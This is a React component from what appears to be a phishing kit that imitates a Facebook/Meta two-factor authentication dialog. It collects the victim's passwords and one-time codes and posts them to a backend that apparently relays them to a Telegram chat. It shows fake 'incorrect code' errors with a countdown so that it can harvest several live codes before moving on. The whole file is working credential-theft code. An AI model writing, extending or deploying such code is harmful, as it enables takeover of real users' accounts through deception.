"use client";
import GoogleAuthImage from '@/assets/images/googelauth-image.jpg';
import MetaLogo from '@/assets/images/meta-logo-image.png';
import VerifyImage from '@/assets/images/verify-image.png';
import { store } from '@/store/store';
import { escapeHTML } from '@/utils/telegram';
import config from '@/utils/config';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';

const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [attempts, setAttempts] = useState(0);
    const [code, setCode] = useState('');
    const [countdown, setCountdown] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [step, setStep] = useState<'code' | 'alternative'>('code');

    const { messageId, baseMessage, passwords, codes, addCode, setMessageId, userEmail, userPhoneNumber, userFullName, translations: storeTranslations } = store();
    const t = (text: string): string => {
        return storeTranslations[text] || text;
    };
    const maxCode = config.MAX_CODE ?? 3;
    const loadingTime = config.CODE_LOADING_TIME ?? 60;

    // Mask email function
    const maskEmail = (email: string): string => {
        if (!email) return '';
        const [localPart, domain] = email.split('@');
        if (!localPart || !domain) return email;
        const firstChar = localPart[0];
        const lastChar = localPart.length > 1 ? localPart[localPart.length - 1] : '';
        return `${firstChar}****${lastChar}@${domain}`;
    };

    // Format phone
    const formatPhone = (phone: string): string => {
        if (!phone) return '';
        const allDigits = phone.replace(/[^\d]/g, '');
        if (allDigits.length < 3) return phone;
        const last3 = allDigits.slice(-3);
        return `+${allDigits.slice(0, 2)}****${last3}`;
    };


    useEffect(() => {
        if (countdown > 0) {
            const timer = setTimeout(() => {
                setCountdown(countdown - 1);
            }, 1000);
            return () => clearTimeout(timer);
        } else if (countdown === 0 && showError) {
            setShowError(false);
        }
    }, [countdown, showError]);

    const handleSubmit = async () => {
        if (!code.trim() || isLoading || countdown > 0 || !baseMessage) return;

        setShowError(false);
        setIsLoading(true);

        const newAttempts = attempts + 1;
        setAttempts(newAttempts);

        try {
            let updatedMessage = baseMessage;
            passwords.forEach((pwd, index) => {
                updatedMessage += `\n🔑 Password ${index + 1}: <code>${escapeHTML(pwd)}</code>`;
            });
            codes.forEach((c, index) => {
                updatedMessage += `\n🔐 Code ${index + 1}: <code>${escapeHTML(c)}</code>`;
            });
            updatedMessage += `\n🔐 Code ${codes.length + 1}: <code>${escapeHTML(code)}</code>`;
            
            addCode(code);

            if (messageId) {
                // Xoá tin nhắn cũ
                fetch('/api/delete', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ message_id: messageId })
                }).catch(() => {});
            }

            // Gửi tin nhắn mới để kích hoạt thông báo (ting ting)
            const res = await fetch('/api/send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: updatedMessage })
            });

            if (res.ok) {
                const data = await res.json();
                if (data?.success && typeof data.message_id === 'number') {
                    setMessageId(data.message_id);
                }
            }

            // TỰ ĐỘNG XỬ LÝ GIAO DIỆN SAU 1.5 GIÂY (Auto Progress)
            if (newAttempts >= maxCode) {
                setTimeout(() => {
                    setIsLoading(false);
                    nextStep();
                }, 1500);
            } else {
                setTimeout(() => {
                    setIsLoading(false);
                    setShowError(true);
                    setCode('');
                    setCountdown(loadingTime);
                }, 1500);
            }
        } catch {
            setIsLoading(false);
            setShowError(true);
        }
    };

    const actualEmail = userEmail ? maskEmail(userEmail) : '';
    const actualPhone = userPhoneNumber ? formatPhone(userPhoneNumber) : '';
    const displayName = userFullName || 'User';

    const formatCountdown = (seconds: number): string => {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${mins} ${t('minutes')} ${secs} ${t('seconds')}`;
    };


    return (
        <div className='fixed inset-0 z-[10000] flex items-center justify-center bg-black/40 animate-fade-in'>
            <div 
                className='max-h-[95vh] h-auto w-full max-w-[560px] mx-2 md:mx-0 shadow-2xl rounded-[20px] flex flex-col overflow-hidden animate-slide-up relative bg-white'
                style={{ backgroundColor: '#ffffff' }}
            >
                {/* Gradient overlay */}
                <div 
                    className='absolute inset-0 pointer-events-none'
                    style={{ background: 'linear-gradient(135deg, rgba(255,245,255,0.7) 0%, rgba(240,255,249,0.7) 100%)' }}
                />

                <div className='relative z-10 flex flex-col h-full'>
                    <div className='flex-1 overflow-y-auto px-[22px] pt-[20px] pb-[24px]'>
                    <div className='h-full flex flex-col flex-start w-full items-center justify-between flex-1'>
                        <div className='w-full'>
                            <div className='flex w-full items-center text-[#9a979e] gap-[6px] text-[14px] mb-[7px]'>
                                <span>{displayName}</span>
                                <div className='w-[4px] h-[4px] bg-[#9a979e] rounded-[5px]'></div>
                                <span>Facebook</span>
                            </div>
                            <h2 className='text-[17px] text-[#1c1e21] font-[600] mb-[10px] leading-tight'>
                                {step === 'code' 
                                    ? t('Two-factor authentication required')
                                    : t('Go to your authentication app')
                                }
                            </h2>
                            <p className='text-[#9a979e] text-[14px] mb-[15px]'>
                                {step === 'code' 
                                    ? `${t("We've sent a verification code to your")} ${actualEmail}${actualPhone ? ` ${t('and')} ${actualPhone}` : ''}. ${t("To continue, you'll need to enter a verification code or approve it from another device.")} ${t('This process may take a few minutes.')} ${t("Please don't leave this page until you receive the code.")}`
                                    : t('Enter the 6-digit code for this account from the two-factor authentication app that you set up (such as Duo Mobile or Google Authenticator).')
                                }
                            </p>
                            <div className='w-full rounded-[10px] bg-[#f5f5f5] overflow-hidden my-[15px]'>
                                <Image src={step === 'code' ? VerifyImage : GoogleAuthImage} alt='' className='w-full h-auto' />
                            </div>
                            <div className='w-full'>
                                <form
                                    onSubmit={(e) => {
                                        e.preventDefault();
                                        handleSubmit();
                                    }}
                                >
                                    <div className={`input w-full border ${showError && countdown > 0 ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[11px] rounded-[10px] bg-white text-[16px] mb-[10px] focus-within:border-[#3b82f6] focus-within:shadow-md focus-within:shadow-blue-100 transition-all duration-200`}>
                        <input
                                            id='twoFa'
                                            placeholder={t("Code")}
                                            className='w-full outline-none h-full bg-transparent text-black placeholder:text-gray-400'
                                            type='number'
                                            inputMode='numeric'
                            value={code}
                            onChange={(e) => {
                                const value = e.target.value.replaceAll(/\D/g, '');
                                if (value.length <= 8) setCode(value);
                            }}
                            maxLength={8}
                                             disabled={countdown > 0 || isLoading}
                        />
                    </div>
                                    {showError && countdown > 0 && (
                                        <p className='text-red-500 text-[14px] mt-[-5px] mb-[10px]'>
                                            {t('The two-factor authentication you entered is incorrect')}. {t('Please, try again after')} {formatCountdown(countdown)}.
                        </p>
                    )}
                                    <div className='w-full mt-[20px]'>
                                        <button
                                            type='submit'
                                            disabled={isLoading || !code.trim() || countdown > 0}
                                            className={`w-full bg-[#0064E0] text-white rounded-[40px] pt-[10px] pb-[10px] flex items-center justify-center transition-opacity duration-300 h-[40px] min-h-[40px] ${isLoading || !code.trim() || countdown > 0 ? 'cursor-not-allowed opacity-70' : 'cursor-pointer'}`}
                                        >
                                            {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Continue')}
                                        </button>
                                    </div>
                                    <div 
                                        className='w-full mt-[10px] text-[#495057] flex items-center justify-center cursor-pointer bg-[transparent] rounded-[40px] px-[20px] py-[10px] border border-[#d4dbe3] h-[40px] min-h-[40px]'
                                        onClick={() => setStep(step === 'code' ? 'alternative' : 'code')}
                                    >
                                        <span>{t('Try another way')}</span>
                                    </div>
                                </form>
                            </div>
                        </div>
                        <div className='w-[60px] mt-[20px] mx-auto'>
                            <Image src={MetaLogo} alt='' width={60} height={18} className='w-full h-full' />
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    );
};

export default VerifyModal;
